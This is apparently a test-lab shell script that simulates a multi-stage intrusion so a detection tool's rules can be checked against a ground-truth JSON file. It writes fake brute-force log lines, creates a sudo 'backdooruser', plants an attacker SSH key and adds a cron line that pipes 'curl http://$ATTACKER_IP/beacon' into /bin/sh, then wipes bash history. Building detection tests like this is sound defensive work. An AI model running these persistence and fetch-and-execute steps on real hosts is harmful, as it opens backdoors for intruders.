#!/bin/sh
# testlab/scenario.sh — Simulated adversary attack scenario for WSL Kali / Linux lab
# Injects realistic multi-stage adversarial actions into system logs & configs
# and writes testlab/ground_truth.json.

set -e

SCRIPT_DIR=$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)
REPO_ROOT=$(CDPATH= cd -- "$SCRIPT_DIR/.." && pwd)
GT_FILE="$REPO_ROOT/testlab/ground_truth.json"

ATTACKER_IP="203.0.113.9"
TARGET_USER="backdooruser"
NOW_ISO=$(date -u +"%Y-%m-%dT%H:%M:%SZ")

echo "[*] Initializing Attack Simulation Scenario on $(hostname)..."

# 1. Simulate SSH brute force burst followed by success into syslog/authlog
echo "[*] Step 1: Simulating SSH brute-force burst from $ATTACKER_IP..."
for user in root admin test support guest; do
    logger -t sshd -p auth.info "Failed password for $user from $ATTACKER_IP port 49152 ssh2"
    sleep 0.1
done
logger -t sshd -p auth.info "Accepted password for kali from $ATTACKER_IP port 49158 ssh2"
logger -t sshd -p auth.info "pam_unix(sshd:session): session opened for user kali(uid=1000) by (uid=0)"

# 2. Simulate User Creation & Privilege Escalation
echo "[*] Step 2: Creating persistence user '$TARGET_USER' and adding to sudo..."
if ! id "$TARGET_USER" >/dev/null 2>&1; then
    useradd -m -s /bin/bash "$TARGET_USER" 2>/dev/null || true
fi
usermod -aG sudo "$TARGET_USER" 2>/dev/null || true

# 3. Simulate Persistence via SSH Key
echo "[*] Step 3: Dropping persistence SSH key..."
TARGET_SSH_DIR="/home/$TARGET_USER/.ssh"
mkdir -p "$TARGET_SSH_DIR"
chmod 700 "$TARGET_SSH_DIR"
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGm1NnQ8m+V1H47Hh46H0sB4tW5i05m33j5r8x9k1l2a attacker@c2" >> "$TARGET_SSH_DIR/authorized_keys"
chmod 600 "$TARGET_SSH_DIR/authorized_keys"
chown -R "$TARGET_USER:$TARGET_USER" "$TARGET_SSH_DIR" 2>/dev/null || true

# 4. Simulate Persistence via Cron
echo "[*] Step 4: Adding malicious cron job..."
CRON_PAYLOAD="* * * * * curl -s http://$ATTACKER_IP/beacon | /bin/sh # C2 Beacon"
(crontab -u "$TARGET_USER" -l 2>/dev/null || true; echo "$CRON_PAYLOAD") | crontab -u "$TARGET_USER" - 2>/dev/null || true

# 5. Simulate Defense Evasion (Wiping bash history after sessions)
echo "[*] Step 5: Evasion - simulating sessions and zeroing bash history..."
for i in 1 2 3 4; do
    logger -t sshd -p auth.info "pam_unix(sshd:session): session opened for user $TARGET_USER(uid=1001) by (uid=0)"
done
TARGET_HIST="/home/$TARGET_USER/.bash_history"
: > "$TARGET_HIST"
chmod 600 "$TARGET_HIST"
chown "$TARGET_USER:$TARGET_USER" "$TARGET_HIST" 2>/dev/null || true

# 6. Record Ground Truth JSON
cat <<EOF > "$GT_FILE"
{
  "scenario_name": "wsl_kali_credential_access_and_persistence",
  "executed_at": "$NOW_ISO",
  "attacker_ip": "$ATTACKER_IP",
  "target_user": "$TARGET_USER",
  "injected_threats": [
    {
      "threat_id": "T1110_brute_force",
      "name": "SSH Brute Force Attack",
      "expected_rule": "brute_force",
      "details": "Burst of >= 5 authentication failures from $ATTACKER_IP"
    },
    {
      "threat_id": "T1110_success_after_burst",
      "name": "Successful Login After Brute Force",
      "expected_rule": "brute_force_success",
      "details": "Accepted login for kali from $ATTACKER_IP immediately following failures"
    },
    {
      "threat_id": "T1136_account_creation",
      "name": "Account Creation & Privilege Grant",
      "expected_rule": "new_account_privilege_grant",
      "details": "User $TARGET_USER created and added to sudo group"
    },
    {
      "threat_id": "T1098_ssh_authorized_keys",
      "name": "SSH Persistence Key",
      "expected_rule": "persistence_after_login",
      "details": "authorized_keys file created/modified for $TARGET_USER"
    },
    {
      "threat_id": "T1053_scheduled_task_cron",
      "name": "Cron Persistence",
      "expected_rule": "persistence_after_login",
      "details": "Crontab created for $TARGET_USER containing curl beacon"
    },
    {
      "threat_id": "T1070_indicator_removal_history",
      "name": "History Deletion Evasion",
      "expected_rule": "wiped_history",
      "details": "Zero-byte .bash_history for active user"
    }
  ]
}
EOF

echo "[+] Attack simulation completed successfully. Ground truth recorded at $GT_FILE"
